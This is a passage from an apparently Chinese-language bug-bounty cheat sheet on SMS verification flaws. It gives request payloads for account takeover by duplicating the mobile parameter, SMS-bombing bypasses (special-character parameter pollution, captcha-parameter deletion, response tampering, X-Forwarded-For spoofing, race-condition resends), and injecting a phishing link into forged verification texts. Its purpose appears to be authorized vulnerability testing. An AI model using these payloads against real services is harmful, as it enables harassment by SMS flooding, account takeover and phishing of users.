- 未限制短信发送次数.


> 高并发建议使用测试号挂代理池
>
> 一分钟内可以发送 10 条以上信息即可尝试提交

## 1. 任意用户

- 手机号双写 (可能获取相同的验证码, 或两个不同的验证码未与手机号做绑定)

  ```
  mobile=13888888888,13899999999
  mobile=13888888888&mobile=13899999999
  ```

## 2. 短信轰炸

1. 横向轰炸

   ```
   可在 Intruder 中向多个不同的手机号发送短信，一般只有众测会收
   ```

2. 纵向轰炸

   ```
   可向一个手机号发送多条短信 (尽量将收到的短信全部截图)
   ```

### 2.1 Bypass

- 参数污染

  ```
  使用 Intruder 在手机号位置添加: 空格,Tab,逗号,0,00,86,086,0086,+86,/n,/r,/n/r,/r/n,%00,x,+)WAFXR#!T 等特殊字符
  ```

- 验证码参数

  ```
  删除验证码参数
  删除或修改删除验证码参数的值 -1,0,1,2,true,True,admin,Admin
  ```

- Cookie

  ```
  删除或修改 Cookie 的部分值
  ```

- 修改返回值

  ```
  修改返回值为 0,1,true,success (状态码：200)
  ```

- 双写

  ```
  mobile=13888888888,138888888888
  mobile=13888888888&mobile=138888888888
  ```

- 伪造为内网 IP

  ```
  添加 X-Forwarded-For:127.0.0.1 或用 burpfakeip 伪造
  ```

- URL 编码

  ```
  一次的 URL 编码和两次的 URL 编码都尝试一下
  ```

- 并发 30 次

  ```
  Burp 拦截后多次点击获取验证码
  在 Burp Repeater 中修改发送方式
  	Send group in sequence (separate connections)
  	Send group in parallel (last-byte sync)
  使用 Turbo Intruder 中的的 examples/race.py
  ```

---

参考链接

- [短信轰炸漏洞绕过的多种方法技巧](https://www.cnblogs.com/backlion/p/17294082.html)
- [记某次SRC短信轰炸漏洞挖掘](https://www.freebuf.com/articles/mobile/385471.html)
- [短信轰炸漏洞](https://www.bilibili.com/video/BV1TS411P7QF/?spm_id_from=333.337.search-card.all.click&vd_source=2dcc7806c9580af60063ca1edb63852d)

## 3. 短信伪造

当我们在测试任意用户时，往往会利用修改接收手机号，使多个手机号收到同一组验证码

例如拦截发送验证码的请求包

```
mobile:13888888888
```

修改为

```
mobile:13888888888,13899999999
```

这时两个手机号会收到相同的验证码，那么就造成了任意用户漏洞

但是在某些情况下，会只有一个手机号接收到了验证码，验证码为

```
66666,13899999999
```

这就造成了短信伪造漏洞，可以任意修改验证码短信内容，那么我们只需要修改请求包为

```
mobile:13888888888,请点击 https://www.example.com 进行验证
```

用户即可接收到一个含有恶意链接的短信

```
66666,请点击 https://www.example.com 进行验证
```

此漏洞可造成用户的财产损失，传播非法网站等危害

---

References

- [教育厅被入侵？发送恶意短信的黑客攻击是怎么实现的？短信伪造漏洞案例讲解！！](https://mp.weixin.qq.com/s/6tvK1tyREzRtgZ2efu1qGA)


- [【src漏洞挖掘】教育厅被入侵？发送恶意短信的黑客攻击是怎么实现的？短信伪造漏洞案例讲解！！](https://www.bilibili.com/video/BV1dJ28YeEwU/?spm_id_from=333.1007.tianma.2-3-6.click&vd_source=2dcc7806c9580af60063ca1edb63852d)
